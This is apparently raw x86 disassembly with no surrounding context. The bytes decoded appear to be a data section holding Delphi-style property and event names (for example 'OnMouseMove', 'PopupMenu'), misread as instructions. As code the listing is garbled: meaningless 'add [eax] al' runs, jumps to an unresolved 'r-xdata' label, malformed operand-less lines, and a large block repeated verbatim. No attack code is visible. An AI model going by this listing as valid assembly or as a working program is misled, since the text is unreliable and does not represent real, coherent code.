arpl [ edx + 0x6f ] si
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
sub [ edx ] al
push 0xa0ff0000
nop
inc esp
add [ eax + 0x4490 ] dh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
popad
je r-xdata
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
xor al 0x42
add [ eax + 0x2 ] al
add bh bh
mov eax 0xcc004636
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
jmp r-xdata
js r-xdata
je r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
outsb
mov al 0xec
inc ebp
outsb
arpl [ eax + 0x28 ] bp
mov eax [ ebp ]
jl r-xdata
add [ eax ] al
dec edi
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ edx + eax ] bh
add bh bh
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
jb r-xdata
inc ebx
mov [ ebp ] al
dec eax
add al [ eax ]
add bh bh
pop [ fs : eax + eax - 0x3c ]
inc esi
add [ eax ] al
add [ eax ] al
add [ 0x35ff0002 ] dh
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
add ah cl
inc eax
add [ eax + eax ] cl
jmp [ edi + eax * 4 + 0x44 ]
insb
cmp al 0x10
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
jb r-xdata
bound ebp [ edx + 0x65 ]
add [ ebp ] 0x60
add al [ eax ]
push eax
aaa
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
inc eax
add [ edx + edi + 0x46 ] dh
add [ eax - 0x3bffb9c6 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
adc [ edx ] bh
inc esi
add [ edx + edi ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jmp r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push ebx
outsb
popad
jo r-xdata
outsd
add [ eax ] dl
sub_45f43c
clc
xor eax [ esi ]
les esi [ esi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax + 0x18004489 ] dh
sub al [ esi ]
jo r-xdata
add [ eax + 0x2a ] cl
inc esi
add [ eax + 0x27 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
je r-xdata
adc [ eax ] al
call 0xffffffff9544f51a
push 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
popad
outsb
dec eax
and al 0x42
add [ eax ] dh
add bh bh
dec esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] ch
inc esp
sbb [ edx ] ch
inc esi
add [ eax + 0x27 ] dh
insb
push esp
dec ebp
inc esp
add [ ecx + eax ] ch
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x6cff0001 ] ah
cli
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb cl bh
outsb
je r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
in al dx
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
fcom [ eax + 0x10044 ]
je r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
mov ah 0xe3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
cmp [ gs : esi ] bh
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
jb r-xdata
outsd
outsb
jae r-xdata
add [ ebx ] cl
inc ebx
jae r-xdata
and al 0x42
add ah ch
add al [ eax ]
inc [ eax + 0x1004668 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109474
outsb
je r-xdata
cmp eax 0x5d0044
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
inc esp
add [ ecx + edi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
stc
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
test [ edi ] bh
inc esp
add [ eax + eax ] dh
dec ecx
imul ebp [ ebp + 0xc ] 0x80045e6
add al [ eax ]
inc eax
push ss
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
cmp al 0x10
outsd
outsb
je r-xdata
inc ebp
add [ eax + 0x2 ] ah
add bh bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
push ebx
arpl [ edx + 0x6f ] si
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
sub [ edx ] al
push 0xa0ff0000
nop
inc esp
add [ eax + 0x4490 ] dh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
popad
je r-xdata
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
xor al 0x42
add [ eax + 0x2 ] al
add bh bh
mov eax 0xcc004636
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
jmp r-xdata
js r-xdata
je r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
outsb
mov al 0xec
inc ebp
outsb
arpl [ eax + 0x28 ] bp
mov eax [ ebp ]
jl r-xdata
add [ eax ] al
dec edi
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ edx + eax ] bh
add bh bh
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
jb r-xdata
inc ebx
mov [ ebp ] al
dec eax
add al [ eax ]
add bh bh
pop [ fs : eax + eax - 0x3c ]
inc esi
add [ eax ] al
add [ eax ] al
add [ 0x35ff0002 ] dh
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
add ah cl
inc eax
add [ eax + eax ] cl
jmp [ edi + eax * 4 + 0x44 ]
insb
cmp al 0x10
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
jb r-xdata
bound ebp [ edx + 0x65 ]
add [ ebp ] 0x60
add al [ eax ]
push eax
aaa
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
inc eax
add [ edx + edi + 0x46 ] dh
add [ eax - 0x3bffb9c6 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
adc [ edx ] bh
inc esi
add [ edx + edi ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jmp r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push ebx
outsb
popad
jo r-xdata
outsd
add [ eax ] dl
sub_45f993
inc esi
add [ eax - 0x50 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
inc [ eax - 0x79 ]
inc esp
add [ eax + 0x4627 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub eax [ edx ]
add bh bh
jo r-xdata
outsd
ja r-xdata
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
loopne r-xdata
outsb
add [ eax ] al
inc eax
add [ eax ] al
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
je r-xdata
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jne r-xdata
add bh bh
adc al 0x38
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
pop eax
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add al [ eax ]
inc esp
inc esi
push ecx
inc ebx
insb
outsd
jae r-xdata
insb
inc ebp
inc esp
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
les esi [ esi ]
inc esi
jb r-xdata
push ecx
loopne r-xdata
outsb
inc ebx
dec edi
je r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
test ch ch
inc ebp
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
loopne r-xdata
fadd [ ebp + 0x44 ]
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
or [ eax + eax ] 0xd
push esi
jb r-xdata
inc ebp
dec edi
outsb
inc esp
jb r-xdata
xor [ ebx + 0x44 ] al
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
loopne r-xdata
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
les esi [ esi ]
inc esi
jb r-xdata
add [ eax + 0x2 ] bl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
sub al 0x42
jb r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc esp
push eax
outsd
jo r-xdata
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
adc [ eax ] al
push edi
add [ eax ] al
add bh bh
les esi [ esi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
imul esi [ ebp + 0x49 ] 0xe06f666e
pop eax
outsb
outsw
loopne r-xdata
jo r-xdata
popad
inc edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al [ eax ]
inc esp
inc esi
inc ebx
inc esp
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
jns r-xdata
inc esi
add [ eax ] al
mov al [ 0xffffffffc4ff0002 ]
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
outsb
dec ebx
jns r-xdata
dec edi
add [ ecx ] cl
dec edi
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] al
inc ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x20 ] bp
inc esp
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
add al [ eax ]
pop eax
inc ecx
add bh bh
add [ eax ] eax
add [ eax ] al
pop eax
inc ecx
add al dl
add al [ eax ]
call eax
loopne r-xdata
jo r-xdata
inc eax
inc esp
add al bl
push 0xe0004441
add [ eax ] eax
jmp eax
outsb
dec eax
imul esp [ ebp + 0x4 ] 0xa80045ee
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
[ eax ] al
inc esp
add al ch
add [ eax ] al
inc edx
add bh bh
les esi [ esi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
inc eax
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
dec ebp
add [ esi ] al
dec edi
outsd
jne r-xdata
push ebp
jo r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
insb
hlt
inc esp
outsd
ja r-xdata
pop eax
push edi
push 0x556c6565
jo r-xdata
dec edi
outsb
dec ebp
inc esi
inc esp
add [ eax ] bh
add [ eax ] eax
enter 0x45ed 0x0
rol [ edx ] 0x0
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
hlt
adc [ edi + 0x6e ] cl
dec ebp
outsd
jne r-xdata
inc eax
inc eax
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
mov eax 0xd8004440
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
pop eax
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
jae r-xdata
push edi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ eax + 0x6a ] al
inc esi
add al bl
and [ esi ] eax
in al 0x22
inc esi
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add ah dl
push 0xfe040046
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ edi + edi ] al
inc esi
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
or [ eax ] eax
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
inc esp
add al bh
add al [ eax ]
add [ eax - 0x12 ] ah
inc ebp
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
inc esi
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcl [ eax - 0x1 ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4600 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x46 ] al
add [ eax + eax + 0x46 ] bh
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x4494776f
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
je r-xdata
jpe r-xdata
inc esp
add [ esi ] al
jl r-xdata
outsd
arpl [ ebx + 0x28 ] bp
inc esp
inc esp
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
sub_460054
mov edi 0xb8ffbdff
push 0x46
add al ah
push 0x46
add [ eax + 0x6b ] bh
inc esi
add al dl
imul eax [ esi ] 0xffffffa4
insb
inc esi
add [ esp + ebp * 2 + 0x693c0046 ] bh
inc esi
add [ eax ] ah
push 0x46
add [ edx + ebp * 2 + 0x540f0046 ] cl
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx ] al
inc esi
add [ eax + eax ] cl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
add [ esi ] eax
mov al [ 0xffffffffb0000000 ]
insd
inc ecx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
outsd
inc esi
add al bh
lea eax [ ecx ]
mov al 0x10
inc edx
add [ ecx * 4 + 0x11880041 ] dl
inc edx
add [ eax + edx + 0x42 ] dl
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add al al
insd
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
rol [ ecx ] 0x1
inc esi
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
add [ ecx ] 0x46
add [ esi + ebp * 2 + 0x20041 ] ch
add eax 0x6d726f46
jae r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + ecx * 2 + 0x6f ] dl
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ eax ] al
add [ eax ] ch
add [ esi ] eax
or al 0x0
nop
add [ esi ] al
pop es
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + eax * 4 ] dh
inc esi
add al bh
lea eax [ ecx ]
mov al 0x10
inc edx
add [ ecx * 4 + 0x11880041 ] dl
inc edx
add [ eax + edx + 0x42 ] dl
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x7f ] cl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
inc eax
enter 0x42 0x4c
add [ eax ] al
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
pop eax
add al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx ] al
inc esi
add ah dl
add al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x4602
add [ ebx + esi + 0x40 ] bh
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
cli
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
aam 0x2
inc esi
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
push eax
inc [ ebp ]
inc eax
int1
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
pop eax
